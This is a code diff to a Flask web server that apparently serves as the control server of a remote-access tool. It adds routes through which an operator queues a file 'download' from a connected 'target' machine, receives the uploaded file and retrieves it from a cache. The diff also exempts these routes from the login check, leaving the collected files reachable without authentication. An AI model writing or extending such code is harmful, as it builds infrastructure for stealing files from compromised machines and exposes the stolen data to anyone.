@@ -6,6 +6,11 @@ import os
 from werkzeug.utils import secure_filename
 VERSION_FILE = os.path.join(os.path.abspath(os.path.dirname(__file__)), "version.txt")
 
+# Temporary local directory to buffer file downloads coming from targets
+DOWNLOAD_CACHE_DIR = os.path.join(os.path.abspath(os.path.dirname(__file__)), "download_cache")
+if not os.path.exists(DOWNLOAD_CACHE_DIR):
+    os.makedirs(DOWNLOAD_CACHE_DIR)
+
 def get_current_version():
     if not os.path.exists(VERSION_FILE):
         with open(VERSION_FILE, "w") as f:
@@ -87,7 +92,7 @@ with open(KEY_FILE, "r") as f:
 @app.before_request
 def restrict_access():
     # These must match the exact def names of your functions
-    allowed_routes = ["login", "submit_key", "live", "patch_upload", "get_patch","get_patch_version"]
+    allowed_routes = ["login", "submit_key", "live", "patch_upload", "get_patch","get_patch_version","request_download", "receive_download", "retrieve_file"]
     
     if request.endpoint in allowed_routes:
         return
@@ -103,6 +108,50 @@ def get_patch_version():
         "status": "success",
         "patch_number": current_ver
     })
+
+# 1. UI triggers this to tell the client: "Hey, prepare this file"
+@app.route("/files/<address>/download", methods=["POST"])
+def request_download(address):
+    user = liveusers.get(address)
+    if not user:
+        return jsonify({"status": "error", "message": "User offline"}), 404
+        
+    data = request.get_json() or {}
+    filename = data.get("target")
+    
+    # Queue the operation down to the client's loop
+    user.pending_file_ops.append({
+        "op": "download",
+        "target": filename
+    })
+    return jsonify({"status": "queued", "message": f"Requested download for {filename}"})
+
+
+# 2. Client hits this to hand over the file data
+@app.route("/files/<address>/receive_download", methods=["POST"])
+def receive_download(address):
+    if "file" not in request.files:
+        return jsonify({"status": "error", "message": "Missing payload data"}), 400
+        
+    file_payload = request.files["file"]
+    if file_payload.filename == "":
+        return jsonify({"status": "error", "message": "Missing file naming convention"}), 400
+
+    # Ensure unique directories per address so files don't overwrite each other
+    target_user_dir = os.path.join(DOWNLOAD_CACHE_DIR, secure_filename(address))
+    if not os.path.exists(target_user_dir):
+        os.makedirs(target_user_dir)
+        
+    safe_name = secure_filename(file_payload.filename)
+    file_payload.save(os.path.join(target_user_dir, safe_name))
+    return jsonify({"status": "success", "message": "Data transferred successfully"})
+
+
+# 3. Web UI checks this endpoint via a link to fetch the buffered file
+@app.route("/files/<address>/retrieve/<filename>", methods=["GET"])
+def retrieve_file(address, filename):
+    target_user_dir = os.path.join(DOWNLOAD_CACHE_DIR, secure_filename(address))
+    return send_from_directory(target_user_dir, secure_filename(filename), as_attachment=True)
 
 @app.route("/patch", methods=["GET", "POST"])
 def patch_upload():
